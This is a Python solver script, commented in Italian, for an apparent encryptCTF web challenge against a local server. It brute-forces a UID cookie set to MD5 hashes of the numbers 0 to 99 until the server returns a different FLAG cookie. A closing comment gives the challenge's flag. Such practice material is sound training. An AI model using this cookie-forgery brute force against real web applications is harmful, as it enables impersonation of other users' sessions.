import hashlib
import requests
import time

ip = "127.0.0.1"
port = "8080"
base_url = f"http://{ip}:{port}"

# helper per ottenere cookie FLAG in modo sicuro
def get_flag_from_response(resp):
    # requests' cookie jar: usa .get per non lanciare KeyError
    flag = resp.cookies.get("FLAG")
    return flag

# controllo MD5
control = "f899139df5e1059396431415e770c6dd"
tester = 100
tester_md5 = hashlib.md5(str(tester).encode()).hexdigest()
print("tester md5 ok:", tester_md5 == control)

sess = requests.Session()  # mantiene cookie tra le richieste (utile se server setta più cookie)
sess.headers.update({"User-Agent": "challenge-client/1.0"})

# prova iniziale
cookies = {"UID": tester_md5}
try:
    r = sess.post(base_url, cookies=cookies, timeout=5)
except requests.RequestException as e:
    print("Errore richiesta iniziale:", e)
    raise SystemExit(1)

print("status:", r.status_code)
print("response len:", len(r.text))
print("response headers:", dict(r.headers))

# Mostra i cookie che sono effettivamente presenti nella jar dopo la risposta
print("cookies ricevuti (jar):", sess.cookies.get_dict())
print("raw-cookie header (Set-Cookie):", r.headers.get("Set-Cookie"))

def_flag = get_flag_from_response(r)
print("default flag:", def_flag)

# se def_flag è None, vuol dire che il server non ha inviato FLAG per questa richiesta di controllo
if def_flag is None:
    print("ATTENZIONE: il server non ha inviato il cookie FLAG per il controllo iniziale.")
    print("Controlla se l'endpoint corretto è:", base_url)
    print("Oppure verifica se serve GET / path diverso o parametri")
    # continua comunque brute-force (potrebbe essere inviato solo per alcuni UID)
    # oppure fermati qui se vuoi:
    # raise SystemExit(1)

# brute-force cycle
for i in range(100):
    md5_i = hashlib.md5(str(i).encode()).hexdigest()
    cookies = {"UID": md5_i}
    try:
        r = sess.post(base_url, cookies=cookies, timeout=5)
    except requests.RequestException as e:
        print(f"request error at i={i}:", e)
        continue

    flag_i = get_flag_from_response(r)

    # debug utile per alcune iterazioni
    if i < 5 or (i % 10 == 0):
        print(f"i={i}, status={r.status_code}, flag_i={flag_i}, set-cookie={r.headers.get('Set-Cookie')}")

    # confronto: se def_flag è None, confronta con None — il primo valore diverso è la FLAG
    if flag_i is not None and flag_i != def_flag:
        print(f"FLAG found at iteration={i} -> {flag_i}")
        break

    # piccolo delay per non stressare il server
    time.sleep(0.05)
else:
    print("Terminato ciclo: nessuna FLAG trovata entro 0..99")

# encryptCTF{y0u_c4nt_U53_m3}